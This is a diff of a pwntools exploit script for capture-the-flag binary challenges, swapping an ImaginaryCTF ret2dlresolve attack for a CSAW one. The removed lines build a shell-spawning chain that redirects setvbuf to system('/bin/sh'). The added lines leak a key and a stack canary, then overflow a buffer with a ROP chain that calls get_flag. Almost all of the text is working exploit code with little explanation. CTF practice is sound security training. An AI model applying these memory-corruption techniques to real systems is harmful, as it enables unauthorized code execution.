@@ -2,18 +2,18 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 
-exe = context.binary = ELF(args.EXE or './vuln_patched')
+exe = context.binary = ELF(args.EXE or './overflow_me_patched')
 
 context.terminal = 'wt.exe wsl -d Ubuntu'.split()
 context.arch = 'amd64'
 context.log_level = 'debug' if args.DEBUG else 'info'
-_, host, port = 'nc cascade.chal.imaginaryctf.org 1337'.split()
+_, host, port = 'nc chals.ctf.csaw.io 21006'.split()
 
 if args.LOCAL_LIBC:
     libc = exe.libc
 elif args.LOCAL:
-    libc = ELF('libc.so.6')
-    ld = ELF('./ld-linux-x86-64.so.2')
+    libc = ELF('')
+    ld = ELF('')
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -55,59 +55,38 @@ def addrx(func, x):
 
 
 gdbscript = '''
-b *(0x0000000000401162+0)
+b *(0x04013f3)
 continue
 '''.format(**locals())
 
 p = start()
-pop_rbp_ret = 0x0040113d
-vuln_load = 0x0000000000401162
+off = 88
+off_1 = 64
 
-'''
-vuln_load is -> lea rax,[rbp-0x40]
-if we set rbp to stdout + 0x40 we can overwrite stdout.
-because we dont have pop rdi gadget, we can overwrite-
-stdout to pointer to /bin/sh string and setvbuf to system
-'''
+# key
+p.send(p64(exe.sym.secret_key))
+p.recvuntil(b'Tell me its address'); p.recvline()
+key = bytes.fromhex(p.recvline().strip().decode())
+log.info(f'key: {key.hex()}')
+p.send(key[::-1])
 
-payload = flat(
-    b'a' * 72,
-    pop_rbp_ret,
-    exe.sym.stdout+0x40,
-    vuln_load,
-    # exe.sym._start,
-)
-
-p.send(payload)
+# val shit
+p.recvuntil(b'A post')
+leak = bytes.fromhex(p.recvline().strip().split()[-1].decode()[2:])
 
 rop = ROP(exe)
-dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=[],data_addr=0x000000404070, resolution_addr=exe.got.setvbuf)
 
-'''
-system() expects char* as its argument.
-so we redirect stdout to stdout + 8 where we put /bin/sh string.
-'''
-payload2 = flat(
-    exe.sym.stdout + 8,
-    b"/bin/sh".ljust(8, b'\0'),
-    b'a'* 40,
-    pop_rbp_ret,
-    0x404f00 + 0x40,
-    vuln_load,
-    dlresolve.payload,
-).ljust(0x200)
-
-
-p.send(payload2)
-rop.ret2dlresolve(dlresolve)
-rop.raw(rop.ret)
-rop.main()
-log.info(rop.dump())
-
-payload3 = flat(
-    b"a" * 72,
-    rop.chain(),
-)
-p.send(payload3)
+log.info(f'leak: {leak.hex()}')
+p.send(flat(
+    b'a' * off_1,
+    leak[::-1],
+    rop.ret.address,
+    rop.ret.address,
+    rop.ret.address,
+    rop.ret.address,
+    rop.ret.address,
+    exe.sym.get_flag,
+    b'\n',
+))
 
 p.interactive()
